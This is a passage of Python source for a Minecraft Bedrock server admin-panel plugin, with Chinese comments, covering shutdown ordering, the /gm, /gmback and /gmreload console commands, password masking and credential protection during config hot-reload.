            self.logger.error(f"注册事件监听失败（消息互通不可用）: {e}")

        try:
            # 每卡一份播报标志的集合形式（详见 _notify_server_start_once 注释）
            self._qq_start_notified = set()
            if getattr(self, "conn_mgr", None) is None:
                self.conn_mgr = ConnectionManager(self.data_dir, self.logger)
            from .hub import AdapterHub
            self.qq_hub = AdapterHub(self)   # Hub 会复用 self.conn_mgr
            self._init_qq_gateway()
        except Exception as e:
            self.logger.error(f"QQ 机器人网关初始化失败: {e}")

        try:
            self._process_delayed_tasks()
        except Exception as e:
            self.logger.warning(f"开服结算延迟任务失败: {e}")

        self.logger.info(f"Web 服务器已启动在 http://{self.web_config['host']}:{self.web_config['port']}")

        # ★★ 首次启动的"警告指令"与"自动生成密码"已按要求**全部删除**。
        #    只留一条**引导性**提示：告诉用户用 /gm 指令自己配。
        #    （用户明确要求：删掉老的警告、删掉自动生成、改成提示用指令。）
        self._announce_gm_setup_help()

    def _announce_gm_setup_help(self) -> None:
        """开服时给一条**引导性**提示：怎么用 /gm 配好面板。

        ★ 设计原则（用户明确要求）
        --------------------------
        * **不是警告。** 之前那些"正在使用默认配置""随机密码请保存"之类的
          警告框全部删掉了 —— 它们对面板服用户毫无帮助（他看不到控制台），
          对终端用户也只是噪音。
        * **已配好就闭嘴。** 账号密码都齐了就不打印，避免每次开服都刷一遍。
        * **只在真的没配好时提示一次**，内容就是"照着敲这几条指令"。
        """
        try:
            user = str((self.web_config or {}).get("admin_user") or "").strip()
            pwd = str((self.web_config or {}).get("admin_pass") or "").strip()
            if user and pwd:
                return          # 已经配好了，不打扰

            missing = []
            if not user:
                missing.append("管理员账号")
            if not pwd:
                missing.append("管理员密码")

            self.logger.info(
                "=" * 62 + "\n"
                "  GreenMoon 面板尚未配置完整"
                f"（缺：{'、'.join(missing)}）。\n"
                "\n"
                "  请在服务器控制台执行下面三条指令完成配置：\n"
                "\n"
                "    /gm port 8080            设置网页后台端口（面板服填内网端口）\n"
                "    /gm name 你的账号         设置管理员账号\n"
                "    /gm pass 你的密码         设置管理员密码（至少 6 位）\n"
                "\n"
                "  配好后：/gm show 可查看当前配置，/gmreload 让改动生效。\n"
                "  输入 /gm 不带参数可随时查看用法。\n"
                + "=" * 62
            )
        except Exception:
            # 这条提示本身绝不能影响开服
            pass

    def _ensure_admin_credentials(self) -> str:
        """检查管理员凭据是否可用；不可用时返回**给用户看的**处理指引。

        ★★ 为什么必须有这个函数（删除自动生成后留下的安全缺口）
        ------------------------------------------------------
        以前"账号或密码为空"会被自动填上 admin + 随机密码，于是空凭据
        永远不会真的出现。现在删掉了自动生成，就必须**显式拒绝**
        空账号 / 空密码登录 —— 否则任何人都能空白登录成为管理员。

        （登录校验那边本来就有非空判断，这里是二次防线 + 给用户
          一条明确的、可执行的指引，而不是让他对着"用户名或密码错误"
          发懵 —— 他根本还没设过密码。）

        返回空字符串 = 凭据齐备；否则返回要展示给用户的提示。
        """
        try:
            cfg = self.web_config or {}
            user = str(cfg.get("admin_user") or "").strip()
            pwd = str(cfg.get("admin_pass") or "").strip()
            if user and pwd:
                return ""
        except Exception:
            return ("面板配置读取失败。请在控制台用 /gm 重新配置账号密码。")

        return (
            "面板尚未完成初始化：还没有设置管理员账号 / 密码。\n"
            "请在服务器控制台执行：\n"
            "  /gm name 你的账号\n"
            "  /gm pass 你的密码\n"
            "（也可先 /gm port 8080 设置端口，再 /gmreload 生效）"
        )

    def _run_mod_bootstrap(self) -> None:
        """加载子插件并执行其 ``setup()``。

        从 ``on_enable`` 里抽出来只有一个目的：让"调用时机"这件事有一个
        带名字的位置，而不是散落在两千行启动流程的中间 —— 顺序错了以后
        很难再被看出来（这正是本次要修的 bug）。

        ⚠ 前置条件（调用方保证，见 on_enable 里的长注释）：
            ``_cache`` / ``_cache_lock`` / ``trust`` / ``cross`` /
            ``_executor`` / ``regex_engine`` 必须**已创建**。
            否则子插件的 ``setup()`` 里一句 ``gm.players.list_online()``
            就会把该子插件直接打成"停用"。
        """
        try:
            boot = self.mod_loader.bootstrap()
            if boot.get("mods"):
                self.logger.info(f"已登记 {len(boot['mods'])} 个子插件")
            failed = boot.get("failed") or []
            if failed:
                # 这些子插件已经被 bootstrap 自动停用（它的行为如此）。
                # 必须明确告诉用户"已经被关掉了"，否则他只看到一行 error。
                self.logger.warning(
                    f"以下子插件 setup() 失败，已自动停用：{', '.join(failed)}。"
                    f"若为 gm API 报错，请确认插件版本与子插件要求的 API 版本匹配。"
                )
        except Exception as e:
            # bootstrap 自己崩了（比如 state.json 坏掉）。子插件这一层功能
            # 整体不可用，但**不能**拖垮服务器。
            self.logger.warning(f"子插件初始化失败（子插件功能不可用）: {e}")

    def on_disable(self):
        self.logger.info("GreenMoon面板 已禁用")

        # ---- 1. 先撤掉所有周期性任务 ----
        # ★ 必须在关线程池 / 关子系统**之前**做。
        #   否则任务还会在下一秒被调度进来，而它依赖的 executor / trust
        #   已经没了 —— 表现为关闭瞬间刷出一串无害但很吵的异常。
        #   （Endstone 没有"取消单个 task"的公开 API，所以这里做的是
        #    把回调置空：任务仍在跑，但立刻返回，不再触碰任何状态。）
        self._periodic_stopped = True
        try:
            self._tps_task = None
        except Exception:
            pass

        # ---- 1a. 停行为记录写入线程 ----
        # ★ 必须尽早停，且 stop() 内部会把队列里剩余记录尽量刷盘。
        #   停在关子系统之前，是因为 writer 线程会用到 logger ——
        #   logger 所属的文件 handler 如果先被关掉，写入线程最后那批
        #   记录会在 flush 时抛异常（虽然被吞掉，但刷出一串噪音日志）。
        try:
            rec = getattr(self, "_behavior", None)
            if rec is not None:
                rec.stop()
        except Exception:
            pass

        # ---- 1a2. 停区块日志系统 ----
        # ★ 顺序紧贴行为记录之后，理由相同：它也有后台写线程。
        #   但比行为记录更关键的一点是 —— 它**持有服务器的世界状态
        #   引用**（回档引擎会 get_dimension）。必须在 _stopping 置位
        #   之后再动它，否则正在跑的批次会去取已经析构的 Level。
        #
        #   ★ _stopping 的置位放在这里（而不是更早）：早于这里，正常
        #     关闭流程中"最后一批记录落盘"就会因为引擎提前收手而丢；
        #     晚于这里，就来不及拦住已经排上队的回档回调。
        try:
            self._stopping = True
        except Exception:
            pass
        try:
            api = getattr(self, "region_api", None)
            if api is not None:
                api.shutdown()
        except Exception as e:
            self.logger.warning(f"关闭区块日志系统失败: {e}")

        # ---- 1b. 停日志采集线程 ----
        # ★ 必须尽早停。采集线程只读文件，但它会把行喂给正则引擎，
        #   而引擎的动作会走网络发送（_regex_send_text → QQ 网关）。
        #   网关如果先关了，采集线程每来一行就抛一次异常，关闭瞬间刷屏。
        #   stop() 内部 join(2s)，是唯一会阻塞的点，但采集线程的正常
        #   一轮只有一次 stat + 少量读，不会超过这个时间。
        try:
            self._stop_log_tailer()
        except Exception:
            pass

        # ---- 2. 可信度模块：把内存里没落盘的改动刷下去 ----
        # ★ 必须在 executor.shutdown() 之前：TrustManager 的落盘走
        #   plugin._executor，池子关了再刷就写不进去了。
        #   这也是老代码的一个真实数据丢失点：_executor.shutdown(wait=False)
        #   会**丢弃**排队的任务，而 trust.preload / _join_worker /
        #   daily_settle 都在这个池子里跑。
        trust = getattr(self, 'trust', None)
        if trust is not None:
            try:
                flush = getattr(trust, "flush", None)
                if callable(flush):
                    flush()
            except Exception as e:
                self.logger.warning(f"关闭时刷写可信度数据失败: {e}")

        # ---- 3. 线程池：这里改用 wait=True ----
        # 理由同上：wait=False 会丢掉排队中的落盘任务。
        # 池子里都是"读盘 / 算分 / 回主线程"这类短任务，等它们收尾
        # 最多几百毫秒，换来的是"不会丢数据"。
        if getattr(self, '_executor', None):
            try:
                self._executor.shutdown(wait=True)
            except Exception:
                pass
        cross = getattr(self, 'cross', None)
        if cross is not None:
            try:
                cross.stop()
            except Exception:
                pass
        mod_loader = getattr(self, 'mod_loader', None)
        if mod_loader is not None:
            try:
                mod_loader.shutdown()
            except Exception:
                pass
        # 子插件 API 解绑：放在 mod_loader.shutdown() 之后，
        # 保证子插件的 teardown 里仍能正常调用 gm。
        try:
            from . import gm as _gm
            _gm.detach()
        except Exception:
            pass
        # 面板日志 handler：先摘除再关闭，避免关闭过程中还有日志进来
        handler = getattr(self, "_panel_log_handler", None)
        if handler is not None:
            try:
                logger = getattr(self, "logger", None)
                if logger is not None and hasattr(logger, "removeHandler"):
                    logger.removeHandler(handler)
            except Exception:
                pass
            try:
                handler.close()
            except Exception:
                pass
            self._panel_log_handler = None
        if hasattr(self, 'httpd') and self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except Exception as e:
                self.logger.warning(f"关闭 Web 服务器时出错: {e}")
        hub = getattr(self, 'qq_hub', None)
        if hub is not None:
            try:
                self._notify_server_stop()
            except Exception as e:
                self.logger.warning(f"[QQ] 发送下线提示时出错: {e}")
            try:
                hub.stop_all()
            except Exception as e:
                self.logger.warning(f"关闭机器人网关时出错: {e}")
        else:
            qq_bot = getattr(self, 'qq_bot', None)
            if qq_bot is not None:
                try:
                    self._notify_server_stop()
                except Exception as e:
                    self.logger.warning(f"[QQ] 发送下线提示时出错: {e}")
                try:
                    qq_bot.stop()
                except Exception as e:
                    self.logger.warning(f"关闭 QQ 网关时出错: {e}")
        self._close_plugin_logging()

    # ------------------------------------------------------- 内置指令入口

    def on_command(self, sender, command, args) -> bool:
        """BDS 指令入口，处理 ``gmback`` 与 ``gmreload`` 两条指令。

        ``/gmback``        停用当前启用的 admin 型子插件，把 /admin 还原为面板自带页
        ``/gmback list``   只列出 admin 型子插件的启用状态，不做任何变更

        存在意义：admin 型子插件一旦启用就会完全接管 ``/admin``，若该页面本身
        坏了（白屏 / JS 报错），管理员在网页上已经没有入口去停用它。这条指令
        提供一条不依赖 Web 界面的退路 —— 服务端后台控制台、游戏内 OP 都能用。

        ``/gmreload``        重读主插件配置 + 重启全部 QQ 机器人（不动服务器）
        ``/gmreload config`` 只重读配置
        ``/gmreload bot``    只重启机器人
        ``/gmreload status`` 只报告当前状态，不做任何变更

        存在意义：改完 config.json 的限流/白名单，或在面板改了机器人卡片后，
        原先只能重启整个服务器才能生效 —— 对在线玩家是硬中断。这条指令把这
        两件事变成秒级、可回执、且不动世界的操作。
        """
        handled = False
        try:
            # 部分版本会把命名空间带进 name（如 greenmoon:gmback），归一化处理
            name = str(getattr(command, "name", "") or "")
            if ":" in name:
                name = name.rsplit(":", 1)[-1]
            if name not in ("gmback", "gmreload", "gm"):
                # ★ 必须显式返回 False，让服务端继续把这条指令交给别的插件。
                #
                # 这里曾经是「if name != "gmback": return self._gm_reload_command(...)」，
                # 而 _gm_reload_command 内部对未知指令**也会** return True —— 于是
                # 任何一条与本插件无关的指令都被当成「已处理」吞掉，别的插件
                # 再也收不到。指令注册是全服共享的，吞别人的指令属于越权行为。
                return False
            handled = True
            if name == "gmreload":
                return self._gm_reload_command(sender, command, args, name)
            if name == "gm":
                return self._gm_config_command(sender, command, args, name)

            argv = [str(a) for a in (args or [])]
            sub = argv[0].lower() if argv else ""

            ld = getattr(self, "mod_loader", None)
            if ld is None:
                self._gmback_reply(sender, "子插件系统未初始化，无法执行。")
                return True

            if sub == "list":
                self._gmback_list(sender, ld)
                return True
            if sub:
                self._gmback_reply(sender, f"未知参数 {argv[0]}，用法：/gmback 或 /gmback list")
                return True

            # ---- 无参数：执行救援 ----
            try:
                uid = ld.enabled_uuid("admin")
            except Exception as e:
                self.logger.error(f"[gmback] 读取 admin 启用状态失败: {e}")
                uid = None

            if not uid:
                self._gmback_reply(
                    sender, "当前没有启用任何 admin 型子插件，/admin 已是面板自带管理页。"
                )
                return True

            try:
                disp = str((ld.installed(uid) or {}).get("name") or uid)
            except Exception:
                disp = str(uid)

            # disable() 对页面型只改内存状态 + 写 gmod.json，不触碰任何服务端
            # 对象，因此无需切主线程（切了反而可能撞上超时返回元组）。
            try:
                r = ld.disable(uid)
            except Exception as e:
                self.logger.error(f"[gmback] 停用 {uid} 失败: {e}")
                self._gmback_reply(sender, f"停用失败：{e}")
                return True

            if bool((r or {}).get("ok")):
                self._gmback_reply(
                    sender,
                    f"已停用 admin 型子插件「{disp}」，/admin 已还原为面板自带管理页。"
                    f"若浏览器仍显示旧页面请强制刷新（Ctrl+F5）。",
                )
                self._log_admin_action(
                    f"[gmback] 已停用 admin 型子插件「{disp}」"
                    f"（由 {self._gmback_sender_name(sender)} 执行）"
                )
                self.logger.info(f"[gmback] 已停用 admin 子插件 {uid}({disp})")
            else:
                self._gmback_reply(
                    sender, f"停用未完成：{(r or {}).get('message') or '未知原因'}"
                )
            return True

        except Exception as e:
            # 绝不能把异常抛回服务端：一旦抛出去，指令可能被其他插件再执行一遍。
            #
            # 但返回值要诚实：只有**确认是本插件的指令**时才返回 True，
            # 否则异常发生在归一化/判断之前，盲目 True 会吞掉别人的指令。
            try:
                self.logger.error(f"[gmback] 指令处理异常: {e}")
                if handled:
                    self._gmback_reply(sender, f"指令执行异常：{e}")
            except Exception:
                pass
            return handled

    def _gmback_reply(self, sender, text: str) -> None:
        """安全回消息。后台控制台的 sender 同样实现 send_message。

        桩环境或极旧版本可能没有该方法，此时降级到日志，保证不抛异常。
        """
        try:
            sender.send_message(str(text))
        except Exception:
            try:
                self.logger.info(str(text))
            except Exception:
                pass

    def _gmback_sender_name(self, sender) -> str:
        """取执行者名字，用于审计日志。控制台 sender 没有 name 时回落「控制台」。"""
        try:
            got = getattr(sender, "name", None)
            if got:
                return str(got)
        except Exception:
            pass
        return "控制台"

    def _gmback_list(self, sender, ld) -> None:
        """只读：报告 admin 型子插件的启用状态，绝不改动任何状态。"""
        try:
            uid = ld.enabled_uuid("admin")
        except Exception as e:
            self._gmback_reply(sender, f"读取 admin 型子插件状态失败：{e}")
            return
        if not uid:
            self._gmback_reply(
                sender, "admin 型子插件：当前无启用项（/admin = 面板自带管理页）"
            )
            return
        try:
            disp = str((ld.installed(uid) or {}).get("name") or uid)
        except Exception:
            disp = str(uid)
        self._gmback_reply(
            sender,
            f"admin 型子插件：已启用「{disp}」(uuid={uid})，/admin 当前被其接管。"
            f"执行 /gmback 可停用它。",
        )

    # --------------------------------------------------- /gmreload 热重载

    def _gm_reload_command(self, sender, command, args, name: str) -> bool:
        """``/gmreload`` 热重载入口（配置 + QQ 机器人）。

        设计要点
        --------
        * **不重启服务器**：只重读配置、重启机器人网关。世界 / 玩家不受影响。
        * **重活丢后台线程**：重启网关要 join 线程、做网络请求，在
          ``on_command`` 里同步做会把主线程卡住（机器人多时可能几秒）。
          因此这里立刻回一句「正在重载」，真正的活在后台线程跑完再回执。
        * **每个子项独立 try**：配置重载失败不应阻止机器人重启，反之亦然。
          否则一个坏配置会让用户连机器人都重启不了。
        * **回执走 sender**：但若执行者下线了，``_gmback_reply`` 会降级到日志。

        子命令：``config`` / ``bot`` / ``status``；无参数 = 两个都做。
        """
        try:
            argv = [str(a) for a in (args or [])]
            sub = argv[0].lower() if argv else ""
            who = self._gmback_sender_name(sender)

            if sub == "status":
                self._gm_reload_status(sender)
                return True
            if sub and sub not in ("config", "bot"):
                self._gmback_reply(
                    sender,
                    f"未知参数 {argv[0]}。用法：/gmreload [config|bot|status]",
                )
                return True

            do_cfg = (not sub) or sub == "config"
            do_bot = (not sub) or sub == "bot"

            self.logger.info(f"[gmreload] 开始热重载（cfg={do_cfg} bot={do_bot}）由 {who} 触发")

            def _work() -> None:
                lines = []
                # ---- 1. 重载主插件配置 ----
                if do_cfg:
                    lines.append(self._reload_web_config())
                # ---- 2. 重启机器人网关 ----
                if do_bot:
                    lines.append(self._restart_qq_bot_for_reload())
                # ---- 汇总回执 ----
                try:
                    self._gmback_reply(
                        sender,
                        "【热重载完成】" + "；".join([x for x in lines if x]),
                    )
                except Exception:
                    pass
                # 审计日志：热重载属于「改全服行为」的操作，必须留痕
                try:
                    self._log_admin_action(
                        f"[gmreload] 热重载完成（cfg={do_cfg} bot={do_bot}）："
                        + "；".join([x for x in lines if x])
                        + f"（由 {who} 执行）"
                    )
                except Exception:
                    pass

            threading.Thread(target=_work, name="gm-reload", daemon=True).start()

            # 立刻给个回执，避免用户以为没反应又敲一遍
            self._gmback_reply(
                sender,
                "正在热重载"
                + ("配置" if do_cfg and not do_bot else "")
                + ("与" if do_cfg and do_bot else "")
                + ("QQ 机器人" if do_bot else "")
                + "…完成后会有第二条回执。服务器不会重启，玩家不受影响。",
            )
            return True
        except Exception as e:
            try:
                self.logger.error(f"[gmreload] 指令处理异常: {e}")
                self._gmback_reply(sender, f"热重载异常：{e}")
            except Exception:
                pass
            return True

    # --------------------------------------------------- /gm 配置指令

    def _gm_config_command(self, sender, command, args, name: str) -> bool:
        """``/gm`` 配置入口 —— 面板服的"没有 stdin 也能配"通道。

        ★ 为什么需要它（面板服的真实处境）
        ----------------------------------
        安装向导走的是"读 stdin"这条路。面板服的控制台常被面板商接成
        日志管道，**没有可读的输入通道** —— 探测会正确判定 False，向导
        跳过，退回自动生成 admin + 乱码密码。这类环境**永远**等不到向导。

        而服主明明有个控制台，只是它只能"发指令"、不能"回答问题"。
        所以这里把配置搬到 BDS 指令上：参数从指令参数来，完全不碰 stdin。

        子命令
        ------
        ``/gm``              显示当前配置 + 用法（同 show）
        ``/gm show``         显示当前配置（密码打码，不泄露）
        ``/gm port 8080``    设置网页后台端口
        ``/gm name admin``   设置管理员账号
        ``/gm pass <密码>``  设置管理员密码
        ``/gm apply``        手动触发一次安装向导（交互式，需要 stdin）

        ★ 安全约定
        ----------
        * 只回显**打码后**的密码，绝不在控制台/游戏内明文回显。
        * 密码明文只出现在用户自己敲的那条指令里（BDS 本身会记录指令，
          这一点无法由插件控制，会在回执里提示用户）。
        * 每次变更都写审计日志（谁改的、改了什么，不含明文密码）。
        """
        try:
            argv = [str(a) for a in (args or [])]
            sub = argv[0].lower() if argv else "show"
            who = self._gmback_sender_name(sender)

            # ---------- 显示当前配置 ----------
            if sub in ("", "show", "status"):
                self._gm_reply_config(sender)
                return True

            # ---------- 手动重跑安装向导 ----------
            if sub in ("apply", "wizard", "setup"):
                return self._gm_apply_wizard(sender)

            # ---------- 三个设置项 ----------
            if sub in ("port", "name", "user", "pass", "password"):
                if len(argv) < 2:
                    self._gmback_reply(
                        sender,
                        f"/gm {argv[0]} 缺少值。用法："
                        + ("/gm port 8080" if sub == "port"
                           else "/gm name admin" if sub in ("name", "user")
                           else "/gm pass 你的密码"),
                    )
                    return True
                value = argv[1]
                # 账号/密码可能含空格（BDS 会把空格拆成多个参数），拼回来。
                # 端口不会，保持单值即可。
                if sub in ("name", "user", "pass", "password") and len(argv) > 2:
                    value = " ".join(argv[1:])
                return self._gm_set_one(sender, sub, value, who)

            self._gmback_reply(
                sender,
                f"未知参数 {argv[0]}。用法：/gm [show|port|name|pass|apply]",
            )
            return True
        except Exception as e:
            try:
                self.logger.error(f"[gm] 指令处理异常: {e}")
                self._gmback_reply(sender, f"/gm 处理异常：{e}")
            except Exception:
                pass
            return True

    def _mask_secret(self, s: str) -> str:
        """把密码打码：只留长度信息，不泄露任何字符。

        ⚠ 不能只遮中间几位 —— 后台密码一旦被旁边的人看到开头几位，
          配合常见的弱口令字典，猜解成本会大幅下降。这里只报长度。

        ⚠ 必须是**实例方法**，不能加 @staticmethod：
          所有调用点都写成 ``self._mask_secret(pwd)``。写成静态方法会让
          ``self`` 被当成 ``s`` 传进去 → TypeError → 整个 /gm show 挂掉。
          这个坑真的踩到过（测试里抓出来的），别改回去。
        """
        n = len(str(s or ""))
        if n <= 0:
            return "(未设置)"
        return "•" * n + f"（{n} 位）"

    def _gm_reply_config(self, sender) -> None:
        """回显当前面板配置（密码打码）。"""
        try:
            cfg = dict(self.web_config or {})
            port = cfg.get("port") or 8080
            user = str(cfg.get("admin_user") or "(未设置)")
            pwd = cfg.get("admin_pass") or ""
            httpd = getattr(self, "httpd", None)
            running = "运行中" if httpd is not None else "未启动（端口可能被占用）"
            host = cfg.get("host") or "0.0.0.0"

            self._gmback_reply(
                sender,
                "【GreenMoon 面板 · 当前配置】\n"
                f"  端口      : {port}   （Web 服务：{running}）\n"
                f"  监听地址  : {host}\n"
                f"  管理员账号: {user}\n"
                f"  管理员密码: {self._mask_secret(pwd)}\n"
                f"  访问地址  : http://<服务器IP>:{port}\n"
                "\n"
                "  修改：/gm port 8080 | /gm name 账号 | /gm pass 密码\n"
                "  改完需要 /gmreload 或重启服务器才会生效。\n"
                "  ⚠ 面板服记得在面板商处把【外网端口】转发到上面的【端口】。"
            )
        except Exception as e:
            self._gmback_reply(sender, f"读取配置失败：{e}")

    def _gm_set_one(self, sender, sub: str, value: str, who: str) -> bool:
        """设置端口 / 账号 / 密码中的一项，并落盘。

        ★ 每一项都先校验再写盘 —— 绝不把非法值写进 config.json。
          否则用户敲错一个数字，重启后就再也起不来了。
        """
        try:
            new_cfg = dict(self.web_config or {})
            label = ""
            shown = ""

            if sub == "port":
                raw = str(value).strip()
                try:
                    p = int(raw)
                except ValueError:
                    self._gmback_reply(sender, f"端口必须是数字，收到的是「{raw}」。用法：/gm port 8080")
                    return True
                if not (1 <= p <= 65535):
                    self._gmback_reply(sender, f"端口范围是 1-65535，收到 {p}。")
                    return True
                new_cfg["port"] = p
                label = "端口"
                shown = str(p)

            elif sub in ("name", "user"):
                u = str(value).strip()
                if not u:
                    self._gmback_reply(sender, "账号不能为空。用法：/gm name admin")
                    return True
                if len(u) > 64:
                    self._gmback_reply(sender, "账号太长了（上限 64 字符）。")
                    return True
                # 拒绝控制字符 / 引号 —— 它们会破坏 JSON 或造成展示异常。
                if any(ch in u for ch in "\"'\\\r\n\t"):
                    self._gmback_reply(sender, "账号不能包含引号、反斜杠或换行符。")
                    return True
                new_cfg["admin_user"] = u
                label = "管理员账号"
                shown = u

            else:  # pass
                pwd = str(value)
                if len(pwd) < 6:
                    self._gmback_reply(
                        sender,
                        f"密码太短（{len(pwd)} 位，至少 6 位）。"
                        "用法：/gm pass 你的密码",
                    )
                    return True
                if len(pwd) > 256:
                    self._gmback_reply(sender, "密码太长了（上限 256 字符）。")
                    return True
                new_cfg["admin_pass"] = pwd
                label = "管理员密码"
                shown = self._mask_secret(pwd)

            self._persist_config(new_cfg)

            # 让 config.json 里允许的旧值同步到内存，避免 /gm show 显示旧值
            try:
                if isinstance(getattr(self, "web_config", None), dict):
                    self.web_config.update(new_cfg)
            except Exception:
                pass

            self._gmback_reply(
                sender,
                f"✓ 已设置{label}：{shown}\n"
                "  已写入 config.json。"
                + ("\n  ⚠ 端口变更需要重启服务器（或 /gmreload）才会生效。"
                   if sub == "port"
                   else "\n  ⚠ 账号/密码立即生效，但已登录的会话可能需要重新登录。")
                + ("\n  ⚠ 提示：密码现在也存在于 BDS 的指令记录里，"
                   "介意的话请在服务器控制台清理，或用 /gm pass 再改一次。"
                   if sub in ("pass", "password") else "")
            )

            # 审计：谁改了什么（不含明文密码）
            try:
                self._log_admin_action(
                    f"[gm] 通过指令修改{label}（由 {who} 执行）"
                )
            except Exception:
                pass
            self.logger.info(f"[gm] {who} 修改了{label}")
            return True
        except Exception as e:
            try:
                self.logger.error(f"[gm] 设置失败: {e}")
                self._gmback_reply(sender, f"设置失败：{e}")
            except Exception:
                pass
            return True

    def _gm_apply_wizard(self, sender) -> bool:
        """``/gm apply`` —— 手动重跑一次安装向导。

        ⚠ 向导本身是交互式的（要读 stdin）。在面板服这种没有输入通道的
          环境里它依然会跳过 —— 所以回执里**明确告诉用户改用
          /gm port|name|pass**，而不是让他干等 120 秒。
        """
        try:
            ok = self._setup_probe_stdin()
            if not ok:
                self._gmback_reply(
                    sender,
                    "当前环境读不到控制台输入（面板服常见），无法运行交互式向导。\n"
                    "请改用指令直接配置：\n"
                    "  /gm port 8080\n"
                    "  /gm name 你的账号\n"
                    "  /gm pass 你的密码",
                )
                return True

            self._gmback_reply(
                sender,
                "正在启动安装向导，请按控制台上的提示逐项输入…",
            )
            threading.Thread(
                target=self._maybe_run_setup_wizard,
                name="gm-setup-manual", daemon=True,
            ).start()
            return True
        except Exception as e:
            try:
                self.logger.error(f"[gm] apply 失败: {e}")
                self._gmback_reply(sender, f"启动向导失败：{e}")
            except Exception:
                pass
            return True

    def _reload_web_config(self) -> str:
        """重读 ``config.json`` 并就地更新 ``self.web_config``。返回一句描述。

        ★★ 为什么这里要**单独防一手"密码被静默重生成"**
        ----------------------------------------------
        ``_load_config()`` 在账号/密码为空时会自动补一个随机强密码 ——
        这在**启动时**是对的（有专门的打印把密码告诉用户），但在
        **热重载**时是灾难：

          * 启动时那次"打印密码"早就执行完了，不会再有第二次；
          * 用户能触发 /gmreload 说明他**已经登录着**，密码本来非空；
          * 但只要 config.json 里的密码字段因为任何原因变空（手滑删了、
            编辑器存成空串、别的程序写坏了），重载就会换一把新密码，
            而**没有任何地方会把新密码告诉用户** —— 他下次登录就被
            锁在门外，且完全不知道发生了什么。

        所以热重载前先把账号密码抓下来，发现重载会"改掉"它们时，
        保留旧值并明确警告。用户在面板里改密码走的是 /api/password
        那条**显式**路径，不依赖热重载。
        """
        try:
            old = getattr(self, "web_config", None) or {}
            new = self._load_config()
            if not isinstance(new, dict):
                return "配置：返回体异常，已保留原配置"

            # ★ 凭据保护：热重载绝不允许悄悄换掉 admin_user / admin_pass。
            old_user = str(old.get("admin_user") or "")
            old_pass = str(old.get("admin_pass") or "")
            new_user = str(new.get("admin_user") or "")
            new_pass = str(new.get("admin_pass") or "")
            cred_note = ""
            if old_user and old_pass and (new_user != old_user
                                          or new_pass != old_pass):
                # 只把差异写进日志，**不回显密码本身**
                if new_user != old_user:
                    cred_note += f"（账号 {old_user} → {new_user} 未生效）"
                    new["admin_user"] = old_user
                if new_pass != old_pass:
                    cred_note += "（密码变更未通过此处生效）"
                    new["admin_pass"] = old_pass
                # 顺手把被改回去的值写回内存态，避免下一次 load 又触发
                self.logger.warning(
                    f"[gmreload] 检测到 config.json 中的登录凭据与运行时不一致，"
                    f"已保留原凭据以**防止你被锁在门外**。"
                    f"如需改密码，请在面板内修改（会走显式保存路径）。"
                )

            # ★★★ 必须在 update 之前把「旧值」抓下来。
            #
            # 第一版把 old_host/old_port 的读取放在 old.update(new) **之后**，
            # 于是拿到的其实是刚写进去的新值，两边永远相等，
            # 「端口变了要提醒重启」这条提示**永远不会出现** —— 用户改了
            # 端口、看到「已重新读取」，以为生效了，实际服务还听在旧端口上。
            # 这类「快照时机」错误不会报错，只会静默给出错误结论。
            old_host, old_port = old.get("host"), old.get("port")

            # ★ 就地更新而不是整体替换。
            #
            # Web 服务持有的是 web_config 这个**对象引用**（构造时传进去的），
            # 若直接 self.web_config = new，运行中的 HTTP 服务仍指着旧 dict，
            # 表现为「指令说重载好了，但面板行为没变」—— 排查起来极费劲。
            # update + 删除多余键，既换内容又保引用。
            if isinstance(old, dict):
                for k in list(old.keys()):
                    if k not in new:
                        try:
                            del old[k]
                        except Exception:
                            pass
                old.update(new)
                self.web_config = old
            else:
                self.web_config = new

            # 端口 / 绑定地址变了必须提示：这两项**不支持**热重载
            # （socket 已经 listen 了）。说清楚，别让用户以为生效了。
            note = ""
            if old_host is not None and (old_host != new.get("host")
                                         or old_port != new.get("port")):
                note = (f"（注意：监听地址 {old_host}:{old_port} → "
                        f"{new.get('host')}:{new.get('port')} 需重启服务器才生效）")
            return f"配置：已重新读取{note}{cred_note}"
        except Exception as e:
            self.logger.warning(f"[gmreload] 重载配置失败: {e}")
            return f"配置：失败（{e}）"

    def _restart_qq_bot_for_reload(self) -> str:
        """重启全部机器人网关。返回一句描述。"""
        hub = getattr(self, "qq_hub", None)
        if hub is None:
            return "机器人：子系统未初始化，已跳过"
        try:
            libs = _load_offline_wheels(self, self.libs_dir)
            if libs is None:
                return "机器人：第三方库不可用，未重启"
            # restart() = stop_all + _boot，卡片配置会被重新读取，
            # 所以「在面板上改了机器人的账号/开关但不重启服务器」这个
            # 最常见的诉求，靠这一步就能满足。
            hub.restart(libs)
            try:
                running = [x for x in hub.status() if x.get("running")]
                return f"机器人：已重启 {len(running)} 个网关"
            except Exception:
                return "机器人：已重启"
        except Exception as e:
            self.logger.warning(f"[gmreload] 重启机器人失败: {e}")
            return f"机器人：失败（{e}）"

    def _gm_reload_status(self, sender) -> None:
        """只读报告：当前配置与服务监听状态、机器人卡片状态。"""
        try:
            cfg = getattr(self, "web_config", None) or {}
            port = cfg.get("port", "?")
            host = cfg.get("host", "?")
        except Exception:
            host, port = "?", "?"

        lines = [f"服务监听：{host}:{port}（改这两项需重启服务器）"]

        hub = getattr(self, "qq_hub", None)
        if hub is None:
            lines.append("机器人：子系统未初始化")
        else:
            try:
                items = hub.status() or []
            except Exception as e:
                items = []
                lines.append(f"机器人：状态读取失败（{e}）")
            if not items:
                lines.append("机器人：未配置任何卡片")
            for it in items:
                tone = ("已连接" if it.get("connected") else
                        ("未运行" if not it.get("running") else "连接中"))
                en = "启用" if it.get("enabled") else "禁用"
                lines.append(
                    f"· {it.get('name') or it.get('id')} [{it.get('type')}] "
                    f"{en}/{tone}"
                )
        self._gmback_reply(sender, "【当前状态】" + "　".join(lines))

    def _init_qq_gateway(self):

        hub = getattr(self, "qq_hub", None)
        if hub is None:
            return
        libs = _load_offline_wheels(self, self.libs_dir)
        if libs is None:
            self.logger.error("[QQ] 第三方库不可用，机器人网关未启动")
            return
        # 兼容旧版预检：对**每张**已启用的官方卡片各做一次 Token 预检。
        # 之前只预检主卡（primary_qqofficial 的第一张），第二张卡填错
        # AppSecret 时日志里毫无提示，用户只能对着「连不上」干瞪眼。
        #
        # 去重键必须带上「凭证指纹」而不只是 card_id：
        # _init_qq_gateway 会被 _restart_qq_gateway 反复调用（每次增删改
        # 卡片都触发一次重载）。若只按 card_id 去重，用户改完 AppID 点保存
        # 后新凭证永远不会被预检 —— 而「改完想验证一下」恰恰是最需要预检
